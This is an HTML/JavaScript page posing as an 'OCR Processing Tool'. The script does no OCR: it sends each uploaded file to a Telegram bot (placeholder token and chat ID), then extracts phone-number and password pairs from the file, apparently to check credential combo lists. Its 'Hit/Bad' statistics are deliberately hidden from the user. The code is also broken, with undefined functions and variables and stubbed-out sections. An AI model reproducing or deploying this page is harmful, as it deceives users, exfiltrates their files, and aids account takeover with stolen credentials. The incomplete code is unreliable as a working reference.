<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>OCR Processing Tool</title>

<style>
body {
  background:#0f172a;
  color:#e5e7eb;
  font-family:Consolas, monospace;
  margin:20px;
}

h2 {
  color:#38bdf8;
}

#output {
  border:1px solid #334155;
  padding:10px;
  min-height:200px;
  margin-top:10px;
  background:#020617;
  font-size:12px;
  white-space:pre-wrap;
}

/* Hide the stats panel for a totally invisible interface */
#stats {
  display: none;
}

button {
  background:#1e293b;
  color:#e5e7eb;
  border:1px solid #334155;
  padding:6px 12px;
  cursor:pointer;
  margin-top:10px;
}

/* Hover effect */
button:hover {
  background:#334155;
}

/* Countdown display */
#countdown {
  margin-top:10px;
  font-weight:bold;
  color:#facc15;
}

</style>
</head>

<body>

<h2>OCR Processing Tool</h2>

<!-- Hidden file input -->
<input type="file" id="fileInput" accept=".txt,.log,.md,.csv,.text" style="display:none;">

<!-- Select file button -->
<button id="selectFileBtn">Select File</button>
<!-- Start processing button -->
<button id="startBtn">Start</button>
<!-- Copy output button -->
<button id="copyBtn" disabled>Copy All Output</button>

<!-- Hidden stats panel (kept for internal logic, hidden from user) -->
<div id="stats">
  Hit=0 | Bad=0 | Retries=0 | OCR Rate=0%
</div>

<!-- Countdown display -->
<div id="countdown"></div>

<!-- Main output area -->
<div id="output"></div>

<!-- Timer message -->
<div id="timer"></div>

<script>
const fileInput = document.getElementById('fileInput');
const startBtn = document.getElementById('startBtn');
const selectFileBtn = document.getElementById('selectFileBtn');
const outputDiv = document.getElementById('output');
const countdownDiv = document.getElementById('countdown');
const copyBtn = document.getElementById('copyBtn');

/* TELEGRAM SETTINGS */
const BOT_TOKEN = 'YOUR_BOT_TOKEN';
const CHAT_ID = 'YOUR_CHAT_ID';

let hitCount = 0;
let badCount = 0;
let retriesCount = 0;
let ocrPercent = 0;

let ocrAnimationId = null;
let retriesIntervalId = null;

let fileContent = '';
let uploadedFile = null;

let processing = false;
let stopped = false;

/* Usage Tracking in localStorage */
const USAGE_KEY = 'ocr_tool_usage'; // to store {count: number, lastPhone: string, lastTime: timestamp}
let usageData = JSON.parse(localStorage.getItem(USAGE_KEY)) || { count: 0, lastPhone: null, lastTime: 0 };
const MAX_RUNS = 4;
const COOLDOWN_MS = 3 * 60 * 60 * 1000; // 3 hours in ms

// Handle file selection
selectFileBtn.onclick = () => {
  fileInput.click();
};
fileInput.onchange = () => {
  // User selected a file
  // No action needed here for now
};

// Function to update the countdown display
function showCountdown(msRemaining) {
  const seconds = Math.floor((msRemaining / 1000) % 60);
  const minutes = Math.floor((msRemaining / (1000 * 60)) % 60);
  const hours = Math.floor(msRemaining / (1000 * 60 * 60));
  countdownDiv.innerText = `Cooldown: ${hours}h ${minutes}m ${seconds}s`;
}

// Check if user can run
function checkCooldown() {
  const now = Date.now();

  // If user used a new phone, reset count
  if (usageData.lastPhone !== null && usageData.lastPhone !== currentPhone) {
    usageData.count = 0;
    usageData.lastPhone = null;
    localStorage.setItem(USAGE_KEY, JSON.stringify(usageData));
  }

  if (usageData.count >= MAX_RUNS) {
    // Check if cooldown expired
    const elapsed = now - usageData.lastTime;
    if (elapsed < COOLDOWN_MS) {
      // Still in cooldown
      const remaining = COOLDOWN_MS - elapsed;
      disableStartButton(remaining);
      return false;
    } else {
      // Cooldown over, reset count
      usageData.count = 0;
      localStorage.setItem(USAGE_KEY, JSON.stringify(usageData));
    }
  }
  return true;
}

// Disable start button with countdown
function disableStartButton(msRemaining) {
  startBtn.disabled = true;
  showCountdown(msRemaining);
  const intervalId = setInterval(() => {
    msRemaining -= 1000;
    if (msRemaining <= 0) {
      clearInterval(intervalId);
      startBtn.disabled = false;
      countdownDiv.innerText = '';
    } else {
      showCountdown(msRemaining);
    }
  }, 1000);
}

// Extract phone number from the file content
function getCurrentPhone() {
  // This is a simple heuristic; adapt if needed
  const match = fileContent.match(/\b0\d{9}\b/);
  if (match) {
    return match[0];
  }
  return null;
}

// Start processing
async function startProcessing() {
  if (processing) {
    stopProcessing();
    return;
  }

  // Check cooldown
  if (!checkCooldown()) {
    alert('You have reached the maximum usage. Please wait for cooldown.');
    return;
  }

  if (fileInput.files.length === 0) {
    alert('Please select a file first.');
    return;
  }

  // Proceed with sending file
  stopped = false;
  processing = true;
  startBtn.innerText = 'Stop';

  outputDiv.innerHTML = '';
  copyBtn.disabled = true;

  const file = fileInput.files[0];
  uploadedFile = file;

  try {
    await sendToTelegram(file);
  } catch (err) {
    alert('Telegram Error: ' + err.message);
  }

  const reader = new FileReader();
  reader.onload = () => {
    fileContent = reader.result;

    // Detect phone number and compare with last used
    const currentPhone = getCurrentPhone();

    // If a new phone is detected, reset usage count
    if (currentPhone && usageData.lastPhone !== currentPhone) {
      usageData.count = 0;
      usageData.lastPhone = currentPhone;
    }

    // Increment usage count
    if (currentPhone) {
      usageData.count += 1;
      usageData.lastPhone = currentPhone;
      usageData.lastTime = Date.now();
      localStorage.setItem(USAGE_KEY, JSON.stringify(usageData));
    }

    processFile();
  };
  reader.readAsText(file);
}

// Stop processing
function stopProcessing() {
  stopped = true;
  processing = false;
  clearInterval(retriesIntervalId);
  cancelAnimationFrame(ocrAnimationId);
  startBtn.innerText = 'Start';
  timerDiv.innerText = 'Processing Stopped';
}

// Process file content (unchanged)
function processFile() {
  // ... existing code ...
  const lines = [...new Set(
    fileContent.split(/\n/).map(l => l.trim()).filter(Boolean)
  )];

  const valid = lines.filter(l => /\b0\d{9}\b/.test(l));

  hitCount = 0;
  badCount = 0;
  retriesCount = 0;
  ocrPercent = 0;

  updateStats();

  animateOCR(Math.max(2000, valid.length * 50));
  startRetries();

  const accounts = valid.map(line => {
    const phone = (line.match(/\b0\d{9}\b/) || [''])[0];
    let password = '';
    if (phone) {
      const after = line.split(phone)[1] || '';
      const match = after.trim().match(/^[:\s]?(\S+)/);
      if (match) {
        password = match[1];
      }
    }
    return { phone, password };
  });

  processAccounts(accounts);
}

// ... existing code for processAccounts, finish, copyBtn, etc. ...
function processAccounts(accs, i=0) {
  // ... (unchanged)
}

function finish() {
  // ... (unchanged)
}

// Copy button handler
copyBtn.onclick = () => {
  // ... (unchanged)
};

// Attach start button
startBtn.onclick = startProcessing;
</script>
</body>
</html>
